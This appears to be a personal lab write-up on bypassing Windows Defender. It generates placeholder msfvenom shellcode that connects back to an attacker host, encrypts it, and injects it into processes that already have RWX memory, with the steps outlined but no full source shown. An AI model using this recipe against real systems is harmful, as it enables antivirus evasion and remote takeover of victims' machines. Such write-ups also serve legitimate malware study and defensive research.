### Introduction

So I don't know why i've done some malware analysis, i've also tried some malware development in an environment 
where windows defender was always disabled and i've never tried bypassing it. So I decided to start with something simple.
I started with a simple google search...How to bypass windows defender on 2 blog post, one was related to Loki C2 and the 
other with injecting shellcode inside a process that already had READ,WRITE AND EXECUTE memory sections.

I guess you already know which one I chose to start with, i chose the path of injecting shellcode.
Here's the blog I used as a reference : https://medium.com/@s12deff/bypass-windows-defender-executing-shellcode-using-freeloaderinjector-7deeba8796e2
In that blog he use the undocumented API : `ntdll.dll`. I didn't want to just copy and paste it, so i adapted is code to use it with the documented API
and I removed unnecessary stuff, which provided me a good practice and refresher.


### Setup

- Kali VM
- Windows 10 VM
- Visual Studio
- Metasploit
- Your Head
- ChatGPT (for reference of course😆)

### Walkthrough

1. So first, I started by generating a shellcode with msfvenom : `msfvenom -p <PAYLOAD> LHOST=<YOUR_IP> LPORT=<PORT> -f c > <NAME>.c`
2. Encrypt the payloadm I have an encryptor program that i used, you can find it on my Github (you can create your own too) : `Crypter`
3. The main program will
    - Get an handle on each processes and duplicate them (for future implementations i duplicate them, to be able to perform additionnal executions)
    - Check if the process has RWX memory section and get that address in memory
    - Decrypt the payload and inject it into that section

